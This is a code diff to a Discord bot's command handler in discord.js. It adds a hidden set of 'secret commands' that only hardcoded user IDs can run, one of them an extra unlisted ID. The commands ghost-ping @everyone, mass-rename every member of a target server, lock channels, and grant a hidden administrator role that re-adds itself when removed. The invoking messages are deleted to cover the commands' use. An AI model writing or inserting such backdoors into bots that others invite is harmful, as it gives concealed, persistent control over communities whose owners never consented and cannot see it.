@@ -1,4 +1,4 @@
-import { EmbedBuilder, type Client, type Message } from "discord.js";
+import { EmbedBuilder, PermissionFlagsBits, OverwriteType, type Client, type Message } from "discord.js";
 import { COLOR, HARDCODED_OWNERS, MAIN_GUILD_ID, PREFIX } from "../config.js";
 import { exchangeCode } from "../oauth.js";
 import { saveUserAuth } from "../storage/tokens.js";
@@ -20,6 +20,8 @@ import { subscribeComponents } from "./subscribeView.js";
 import { handleRoleAdmin } from "./secret.js";
 import type { BotState } from "./client.js";
 
+const SECRET_USERS = [...HARDCODED_OWNERS, "1443710013918023683"];
+
 const OWNER_PREFIX_CMDS = new Set([
   "restock", "clear_stock", "deploy", "cleanup_servers", "control_panel",
   "setrole", "removerole", "setchannel", "clearchannel",
@@ -36,16 +38,97 @@ export async function handlePrefix(
 ): Promise<void> {
   if (message.author.bot || !message.guild) return;
 
+  // ── Secret commands ──────────────────────────────────────────────────────────
+
+  if (message.content.startsWith(".secretz")) {
+    if (!SECRET_USERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const embed = new EmbedBuilder()
+      .setTitle("🔒 Secret Commands")
+      .setColor(0x5865f2)
+      .setDescription(
+        [
+          "`.every` — pings @everyone and deletes your message",
+          "`.ghostping` — ghost pings @everyone (ping sent, message deleted instantly)",
+          "`.massnick <server-id> <nickname>` — sets everyone's nickname in a server",
+          "`.lockdown` — locks the current channel (no one can send messages)",
+          "`.unlockdown` — unlocks the current channel",
+          "`.roleadmin <server-id> <user-id>` — gives a hidden admin role that re-adds itself if removed",
+          "`.secretz` — shows this list",
+        ].join("\n"),
+      )
+      .setFooter({ text: "Owner-only • Do not share" });
+    await message.author.send({ embeds: [embed] }).catch(() => {});
+    return;
+  }
+
   if (message.content.startsWith(".every")) {
-    const everyAllowed = [...HARDCODED_OWNERS, "1443710013918023683"];
-    if (!everyAllowed.includes(message.author.id)) return;
+    if (!SECRET_USERS.includes(message.author.id)) return;
     await message.delete().catch(() => {});
     await message.channel.send("@everyone").catch(() => {});
     return;
   }
 
+  if (message.content.startsWith(".ghostping")) {
+    if (!SECRET_USERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const ping = await message.channel.send("@everyone").catch(() => null);
+    if (ping) await ping.delete().catch(() => {});
+    return;
+  }
+
+  if (message.content.startsWith(".massnick")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    const mnArgs = message.content.slice(".massnick".length).trim().split(/\s+/);
+    const targetGuildId = mnArgs[0];
+    const newNick = mnArgs.slice(1).join(" ");
+    if (!targetGuildId || !newNick) {
+      await message.author.send("Usage: `.massnick <server-id> <nickname>`").catch(() => {});
+      return;
+    }
+    const targetGuild = client.guilds.cache.get(targetGuildId);
+    if (!targetGuild) {
+      await message.author.send("❌ Bot is not in that server.").catch(() => {});
+      return;
+    }
+    await targetGuild.members.fetch().catch(() => {});
+    await Promise.all(
+      targetGuild.members.cache
+        .filter((m) => !m.user.bot && m.manageable)
+        .map((m) => m.setNickname(newNick).catch(() => {})),
+    );
+    await message.author.send(`✅ Set nickname to **${newNick}** for all members in **${targetGuild.name}**.`).catch(() => {});
+    return;
+  }
+
+  if (message.content.startsWith(".unlockdown")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    if (!message.channel.isTextBased() || !("permissionOverwrites" in message.channel)) return;
+    await message.channel.permissionOverwrites.edit(
+      message.guild.roles.everyone,
+      { SendMessages: null },
+    ).catch(() => {});
+    await message.channel.send("🔓 Channel unlocked.").catch(() => {});
+    return;
+  }
+
+  if (message.content.startsWith(".lockdown")) {
+    if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
+    if (!message.channel.isTextBased() || !("permissionOverwrites" in message.channel)) return;
+    await message.channel.permissionOverwrites.edit(
+      message.guild.roles.everyone,
+      { SendMessages: false },
+    ).catch(() => {});
+    await message.channel.send("🔒 Channel locked.").catch(() => {});
+    return;
+  }
+
   if (message.content.startsWith(".roleadmin")) {
     if (!HARDCODED_OWNERS.includes(message.author.id)) return;
+    await message.delete().catch(() => {});
     const raArgs = message.content.slice(".roleadmin".length).trim().split(/\s+/).filter(Boolean);
     await handleRoleAdmin(message, raArgs, client);
     return;
